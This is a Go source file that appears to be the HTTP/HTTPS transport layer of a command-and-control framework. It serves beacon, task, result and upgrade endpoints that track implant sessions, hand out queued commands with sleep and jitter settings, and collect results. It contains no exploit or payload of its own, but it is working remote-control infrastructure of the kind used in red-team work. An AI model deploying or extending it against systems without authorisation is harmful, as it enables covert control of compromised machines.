package transport

import (
	"context"
	"crypto/rand"
	"crypto/tls"
	"encoding/base32"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/ditto/ditto/core"
	"github.com/ditto/ditto/tasks"
)

// HTTPTransport implements HTTP/HTTPS transport
type HTTPTransport struct {
	server      *http.Server
	listener    net.Listener
	config      *core.Config
	logger      interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
	c2Server    *Server // Reference to C2 server for session/task management
	sessions    map[string]*transportSession
	sessionsMu  sync.RWMutex
	taskQueue   *tasks.Queue
}

type transportSession struct {
	ID          string
	RemoteAddr  string
	ConnectedAt time.Time
	LastSeen    time.Time
	Metadata    map[string]interface{}
}

// NewHTTPTransport creates a new HTTP transport with its own task queue
func NewHTTPTransport(config *core.Config, logger interface {
	Info(string, ...interface{})
	Debug(string, ...interface{})
	Error(string, ...interface{})
}) *HTTPTransport {
	return NewHTTPTransportWithTaskQueue(config, logger, tasks.NewQueue(1000))
}

// NewHTTPTransportWithTaskQueue creates a new HTTP transport with a shared task queue
func NewHTTPTransportWithTaskQueue(config *core.Config, logger interface {
	Info(string, ...interface{})
	Debug(string, ...interface{})
	Error(string, ...interface{})
}, taskQueue *tasks.Queue) *HTTPTransport {
	return &HTTPTransport{
		config:    config,
		logger:    logger,
		taskQueue: taskQueue,
	}
}

func (ht *HTTPTransport) Name() string {
	if ht.config.Server.TLSEnabled {
		return "https"
	}
	return "http"
}

func (ht *HTTPTransport) Start(ctx context.Context, tConfig *TransportConfig) error {
	// Initialize session management
	if ht.sessions == nil {
		ht.sessions = make(map[string]*transportSession)
	}
	
	// Use shared task queue if provided, otherwise create a new one
	if ht.taskQueue == nil {
		ht.taskQueue = tasks.NewQueue(1000)
	}
	
	mux := http.NewServeMux()
	mux.HandleFunc("/beacon", ht.handleBeacon)
	mux.HandleFunc("/task", ht.handleTask)
	mux.HandleFunc("/result", ht.handleResult)
	mux.HandleFunc("/upgrade", ht.handleUpgrade)
	
	ht.server = &http.Server{
		Handler:      mux,
		ReadTimeout:  ht.config.Server.ReadTimeout,
		WriteTimeout: ht.config.Server.WriteTimeout,
		IdleTimeout:  ht.config.Server.KeepAlive,
	}
	
	// Only use TLS if explicitly enabled in TransportConfig
	// The global config TLSEnabled setting applies to the main server, not listeners
	if tConfig.TLSEnabled {
		certPath := tConfig.TLSCertPath
		keyPath := tConfig.TLSKeyPath
		
		// Fallback to config paths if TransportConfig paths are empty
		if certPath == "" || keyPath == "" {
			certPath = ht.config.Server.TLSCertPath
			keyPath = ht.config.Server.TLSKeyPath
		}
		
		// Validate certificate paths before starting TLS listener
		if certPath == "" || keyPath == "" {
			return fmt.Errorf("TLS is enabled but certificate paths are not configured\n"+
				"  Solution 1: Provide certificate paths in TransportConfig\n"+
				"  Solution 2: Configure certificate paths in config\n"+
				"  Solution 3: Set TLSEnabled: false in TransportConfig for plain HTTP")
		}
		
		// Check if certificates exist
		if _, err := os.Stat(certPath); os.IsNotExist(err) {
			return fmt.Errorf("TLS certificate file not found: %s\n"+
				"  Solution: Generate certificates or provide valid certificate paths", certPath)
		}
		
		if _, err := os.Stat(keyPath); os.IsNotExist(err) {
			return fmt.Errorf("TLS key file not found: %s\n"+
				"  Solution: Generate certificates or provide valid certificate paths", keyPath)
		}
		
		tlsConfig := &tls.Config{
			MinVersion: tls.VersionTLS12,
		}
		ht.server.TLSConfig = tlsConfig
		
		var err error
		ht.listener, err = tls.Listen("tcp", tConfig.BindAddr, tlsConfig)
		if err != nil {
			return fmt.Errorf("failed to start TLS listener: %w", err)
		}
	} else {
		// Plain HTTP listener
		var err error
		ht.listener, err = net.Listen("tcp", tConfig.BindAddr)
		if err != nil {
			return fmt.Errorf("failed to start listener: %w", err)
		}
	}
	
	ht.logger.Info("HTTP transport started on %s", tConfig.BindAddr)
	
	go func() {
		if tConfig.TLSEnabled {
			certPath := tConfig.TLSCertPath
			keyPath := tConfig.TLSKeyPath
			
			// Fallback to config paths if TransportConfig paths are empty
			if certPath == "" || keyPath == "" {
				certPath = ht.config.Server.TLSCertPath
				keyPath = ht.config.Server.TLSKeyPath
			}
			
			// Validate certificate paths before starting
			if certPath == "" || keyPath == "" {
				ht.logger.Error("TLS enabled but certificate paths not configured")
				return
			}
			
			ht.server.ServeTLS(ht.listener, certPath, keyPath)
		} else {
			ht.server.Serve(ht.listener)
		}
	}()
	
	return nil
}

func (ht *HTTPTransport) Stop() error {
	if ht.server != nil {
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		return ht.server.Shutdown(ctx)
	}
	return nil
}

func (ht *HTTPTransport) Accept() (Connection, error) {
	// HTTP connections are handled per-request
	return nil, fmt.Errorf("HTTP transport does not support Accept()")
}

func (ht *HTTPTransport) Connect(ctx context.Context, addr string) (Connection, error) {
	// Client-side connection via HTTP client
	client := &http.Client{
		Timeout: 30 * time.Second,
	}
	
	// Determine protocol
	url := addr
	if !hasProtocol(addr) {
		if ht.config.Server.TLSEnabled {
			url = "https://" + addr
		} else {
			url = "http://" + addr
		}
	}
	
	req, err := http.NewRequestWithContext(ctx, "GET", url+"/beacon", nil)
	if err != nil {
		return nil, fmt.Errorf("failed to create request: %w", err)
	}
	
	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("failed to connect: %w", err)
	}
	
	// Create a client-side HTTP connection wrapper
	return NewHTTPClientConnection(req, resp), nil
}

func hasProtocol(addr string) bool {
	return len(addr) > 7 && (addr[:7] == "http://" || addr[:8] == "https://")
}

func (ht *HTTPTransport) handleBeacon(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost && r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	
	sessionID := r.Header.Get("X-Session-ID")
	newSessionCreated := false
	
	ht.sessionsMu.Lock()
	var session *transportSession
	
	if sessionID != "" {
		// Session ID provided - find existing session
		session, _ = ht.sessions[sessionID]
	}
	
	if session == nil {
		// No session ID or session not found - try to match by RemoteAddr
		// This handles the case where implant lost its session ID but is reconnecting
		for id, existingSession := range ht.sessions {
			if existingSession.RemoteAddr == r.RemoteAddr {
				session = existingSession
				sessionID = id
				break
			}
		}
	}
	
	if session == nil {
		// Truly new session - generate new ID
		sessionID = generateTransportSessionID()
		session = &transportSession{
			ID:          sessionID,
			RemoteAddr:  r.RemoteAddr,
			ConnectedAt: time.Now(),
			LastSeen:    time.Now(),
			Metadata:    make(map[string]interface{}),
		}
		ht.sessions[sessionID] = session
		newSessionCreated = true
		// Don't log to stdout to avoid interrupting readline prompt
		// Log will be written to file if file logging is enabled
		ht.logger.Debug("New session: %s from %s", sessionID, r.RemoteAddr)
	} else {
		// Existing session - update LastSeen
		session.LastSeen = time.Now()
		// Update RemoteAddr in case it changed (NAT, etc.)
		if session.RemoteAddr != r.RemoteAddr {
			session.RemoteAddr = r.RemoteAddr
		}
	}
	ht.sessionsMu.Unlock()
	
	// Read client metadata
	var metadata map[string]interface{}
	if r.Body != nil {
		if err := json.NewDecoder(r.Body).Decode(&metadata); err == nil {
			session.Metadata = metadata
		}
	}
	
	// Get pending tasks for this session
	pendingTasks := ht.getPendingTasks(sessionID)
	
	response := map[string]interface{}{
		"session_id": sessionID,
		"tasks":      pendingTasks,
		"sleep":      ht.config.Communication.Sleep.Seconds(),
		"jitter":     ht.config.Communication.Jitter,
	}
	
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(response)
	
	// Trigger notification for new sessions (only for truly new ones)
	if newSessionCreated {
		// This will be handled by syncSessionsWithContext
	}
}

func (ht *HTTPTransport) handleTask(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	
	sessionID := r.Header.Get("X-Session-ID")
	if sessionID == "" {
		http.Error(w, "Missing session ID", http.StatusBadRequest)
		return
	}
	
	tasks := ht.getPendingTasks(sessionID)
	
	// Mark tasks as in-progress and schedule removal
	for _, taskMap := range tasks {
		if taskID, ok := taskMap["id"].(string); ok {
			if ht.taskQueue != nil {
				ht.taskQueue.UpdateStatus(taskID, "in_progress")
				// Remove task after completion timeout (30 seconds)
				go func(id string) {
					time.Sleep(30 * time.Second)
					if task := ht.taskQueue.Get(id); task != nil && task.Status == "in_progress" {
						ht.taskQueue.Remove(id)
					}
				}(taskID)
			}
		}
	}
	
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"tasks": tasks,
	})
}

func (ht *HTTPTransport) handleResult(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	
	sessionID := r.Header.Get("X-Session-ID")
	if sessionID == "" {
		http.Error(w, "Missing session ID", http.StatusBadRequest)
		return
	}
	
	var result map[string]interface{}
	if err := json.NewDecoder(r.Body).Decode(&result); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}
	
	// Update task status and remove after completion
	if taskID, ok := result["task_id"].(string); ok {
		if ht.taskQueue != nil {
			ht.taskQueue.SetResult(taskID, result)
			// Remove task after a short delay to allow result processing
			go func() {
				time.Sleep(5 * time.Second)
				ht.taskQueue.Remove(taskID)
			}()
		}
	}
	
	ht.logger.Info("Task result from session %s: %v", sessionID, result)
	
	w.WriteHeader(http.StatusOK)
	w.Write([]byte("OK"))
}

func (ht *HTTPTransport) handleUpgrade(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	
	sessionID := r.Header.Get("X-Session-ID")
	if sessionID == "" {
		http.Error(w, "Missing session ID", http.StatusBadRequest)
		return
	}
	
	ht.sessionsMu.Lock()
	session, exists := ht.sessions[sessionID]
	if !exists {
		ht.sessionsMu.Unlock()
		http.Error(w, "Session not found", http.StatusNotFound)
		return
	}
	
	// Mark session as upgraded to interactive
	session.Metadata["upgraded"] = true
	session.Metadata["upgraded_at"] = time.Now()
	ht.sessionsMu.Unlock()
	
	ht.logger.Info("Session %s upgraded to interactive", sessionID)
	
	response := map[string]interface{}{
		"status":      "success",
		"session_id":  sessionID,
		"session_type": "interactive",
	}
	
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(response)
}

func (ht *HTTPTransport) getPendingTasks(sessionID string) []map[string]interface{} {
	if ht.taskQueue == nil {
		return []map[string]interface{}{}
	}
	
	pending := ht.taskQueue.GetPending()
	tasks := make([]map[string]interface{}, 0, len(pending))
	
	for _, task := range pending {
		// Filter tasks by session if specified in parameters
		if task.Parameters != nil {
			if taskSessionID, ok := task.Parameters["session_id"].(string); ok {
				if taskSessionID != sessionID {
					continue
				}
			}
		}
		
		tasks = append(tasks, map[string]interface{}{
			"id":         task.ID,
			"type":       task.Type,
			"command":    task.Command,
			"parameters": task.Parameters,
		})
	}
	
	return tasks
}

func generateTransportSessionID() string {
	// Generate short session ID similar to Sliver/Empire (8-10 characters)
	// Use base32 encoding for readability (no ambiguous chars like 0/O, 1/I)
	bytes := make([]byte, 6)
	if _, err := rand.Read(bytes); err != nil {
		// Fallback to timestamp-based ID if crypto/rand fails
		return fmt.Sprintf("%x", time.Now().UnixNano())[:8]
	}
	encoded := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(bytes)
	return strings.ToLower(encoded[:8]) // Use first 8 characters
}

// EnqueueTask adds a task to the queue
func (ht *HTTPTransport) EnqueueTask(task *tasks.Task) error {
	if ht.taskQueue == nil {
		ht.taskQueue = tasks.NewQueue(1000)
	}
	return ht.taskQueue.Add(task)
}

// HTTPConnection wraps HTTP request/response as a connection (server-side)
type HTTPConnection struct {
	req  *http.Request
	resp http.ResponseWriter
	done chan struct{}
}

func NewHTTPConnection(req *http.Request, resp http.ResponseWriter) *HTTPConnection {
	return &HTTPConnection{
		req:  req,
		resp: resp,
		done: make(chan struct{}),
	}
}

// HTTPClientConnection wraps HTTP response for client-side connections
type HTTPClientConnection struct {
	req  *http.Request
	resp *http.Response
	done chan struct{}
}

func NewHTTPClientConnection(req *http.Request, resp *http.Response) *HTTPClientConnection {
	return &HTTPClientConnection{
		req:  req,
		resp: resp,
		done: make(chan struct{}),
	}
}

func (hc *HTTPClientConnection) Read(b []byte) (n int, err error) {
	if hc.resp.Body == nil {
		return 0, io.EOF
	}
	return hc.resp.Body.Read(b)
}

func (hc *HTTPClientConnection) Write(b []byte) (n int, err error) {
	// Client connections are read-only from response
	return 0, fmt.Errorf("client connection is read-only")
}

func (hc *HTTPClientConnection) Close() error {
	if hc.resp.Body != nil {
		hc.resp.Body.Close()
	}
	close(hc.done)
	return nil
}

func (hc *HTTPClientConnection) RemoteAddr() net.Addr {
	if hc.resp.Request != nil && hc.resp.Request.URL != nil {
		host := hc.resp.Request.URL.Host
		host, port, err := net.SplitHostPort(host)
		if err == nil {
			if ip := net.ParseIP(host); ip != nil {
				portNum := 0
				if port != "" {
					fmt.Sscanf(port, "%d", &portNum)
				}
				return &net.TCPAddr{IP: ip, Port: portNum}
			}
		}
	}
	return &net.TCPAddr{IP: net.IPv4(0, 0, 0, 0), Port: 0}
}

func (hc *HTTPClientConnection) LocalAddr() net.Addr {
	return nil
}

func (hc *HTTPClientConnection) SetDeadline(t time.Time) error {
	return nil
}

func (hc *HTTPClientConnection) SetReadDeadline(t time.Time) error {
	return nil
}

func (hc *HTTPClientConnection) SetWriteDeadline(t time.Time) error {
	return nil
}

func (hc *HTTPConnection) Read(b []byte) (n int, err error) {
	return hc.req.Body.Read(b)
}

func (hc *HTTPConnection) Write(b []byte) (n int, err error) {
	return hc.resp.Write(b)
}

func (hc *HTTPConnection) Close() error {
	close(hc.done)
	return nil
}

func (hc *HTTPConnection) RemoteAddr() net.Addr {
	host, port, err := net.SplitHostPort(hc.req.RemoteAddr)
	if err != nil {
		return &net.TCPAddr{IP: net.IPv4(0, 0, 0, 0), Port: 0}
	}
	ip := net.ParseIP(host)
	if ip == nil {
		return &net.TCPAddr{IP: net.IPv4(0, 0, 0, 0), Port: 0}
	}
	portNum := 0
	if port != "" {
		fmt.Sscanf(port, "%d", &portNum)
	}
	return &net.TCPAddr{IP: ip, Port: portNum}
}

func (hc *HTTPConnection) LocalAddr() net.Addr {
	return nil
}

func (hc *HTTPConnection) SetDeadline(t time.Time) error {
	return nil
}

func (hc *HTTPConnection) SetReadDeadline(t time.Time) error {
	return nil
}

func (hc *HTTPConnection) SetWriteDeadline(t time.Time) error {
	return nil
}

